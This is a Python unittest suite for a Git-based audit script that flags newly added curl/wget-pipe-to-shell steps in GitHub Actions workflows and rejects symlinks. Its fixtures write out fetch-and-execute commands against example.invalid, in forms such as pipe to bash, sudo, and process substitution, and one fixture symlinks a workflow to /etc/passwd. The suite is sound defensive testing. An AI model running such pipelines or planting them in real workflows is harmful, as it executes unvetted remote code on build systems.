"""Real Git adversarial fixtures for a narrow read-only remote shell ratchet."""
import importlib.util
import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path

HERE = Path(__file__).resolve().parents[1]
SRC = HERE / "scripts" / "zcloud_remote_shell_ratchet_20261015_w1.py"
spec = importlib.util.spec_from_file_location("zcloud_remote_shell_ratchet", SRC)
mod = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = mod
spec.loader.exec_module(mod)


def call(repo, *args):
    return subprocess.check_output(["git", "-C", str(repo), *args], text=True).strip()


class RatchetTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.repo = Path(self.tmp.name)
        call(self.repo, "init", "-q")
        call(self.repo, "config", "user.email", "tests@example.invalid")
        call(self.repo, "config", "user.name", "Test")
        self.write("name: demo\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo safe\n")
        self.base = self.commit()

    def write(self, contents):
        target = self.repo / ".github" / "workflows" / "demo.yml"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(contents, encoding="utf-8")

    def commit(self):
        call(self.repo, "add", "-A")
        call(self.repo, "commit", "-qm", "fixture", "--allow-empty")
        return call(self.repo, "rev-parse", "HEAD")

    def test_safe_sha_does_not_acquire_deploy_permission(self):
        r = mod.audit(self.repo, self.base, self.base)
        self.assertEqual(r.new_risky_workflows, 0)
        self.assertFalse(r.deployment_authorized)
        self.assertFalse(r.mutation_performed)

    def test_new_curl_pipe_bash_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/install.sh | bash\n")
        head = self.commit()
        self.assertEqual(mod.audit(self.repo, self.base, head).new_risky_workflows, 1)
        self.assertEqual(mod.main(["--repo", str(self.repo), "--base", self.base, "--head", head]), 1)

    def test_new_multiline_wget_pipe_sh_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          wget -qO- https://example.invalid/tool \\\n            | sh\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 1)

    def test_absolute_path_shell_pipeline_rejected(self):
        self.write("jobs:\\n  x:\\n    steps:\\n      - run: curl -fsSL https://example.invalid/install | /bin/bash\\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_sudo_flags_and_full_path_shell_rejected(self):
        self.write("jobs:\\n  x:\\n    steps:\\n      - run: wget -qO- https://example.invalid/i | sudo -E /usr/bin/bash\\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_env_shell_process_substitution_rejected(self):
        self.write("jobs:\\n  x:\\n    steps:\\n      - run: /usr/bin/env bash <(curl -fsSL https://example.invalid/i)\\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_process_substitution_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: bash <(curl -fsSL https://example.invalid/s)\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_comment_and_regular_text_not_blocked(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          # curl foo | bash\n          echo 'curl not executing'\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_unmodified_legacy_finding_grandfathered(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl https://example.invalid | bash\n")
        legacy = self.commit()
        self.assertEqual(mod.audit(self.repo, legacy, legacy).new_risky_workflows, 0)
        self.assertEqual(mod.audit(self.repo, legacy, legacy).baseline_findings, 1)
        self.write("jobs:\n  x:\n    steps:\n      - run: curl https://example.invalid | bash\n      - run: echo added\n")
        self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)

    def test_symlink_tree_rejected_and_redacted(self):
        target = self.repo / ".github/workflows/demo.yml"
        target.unlink()
        target.symlink_to("/etc/passwd")
        head = self.commit()
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, head)

    def test_missing_sha_and_wrong_ancestry_denied(self):
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, "main", self.base)
        self.write("jobs:\n  x:\n    steps:\n      - run: echo new\n")
        head = self.commit()
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, head, self.base)

    def test_cli_outputs_zero_authority_failure(self):
        s = io.StringIO()
        with redirect_stdout(s):
            code = mod.main(["--repo", str(self.repo), "--base", "notasha", "--head", self.base])
        v = json.loads(s.getvalue())
        self.assertEqual(code, 2)
        self.assertIs(v["source_complete"], False)
        self.assertFalse(v["release_authorized"])
        self.assertNotIn(str(self.repo), s.getvalue())


if __name__ == "__main__":
    unittest.main()
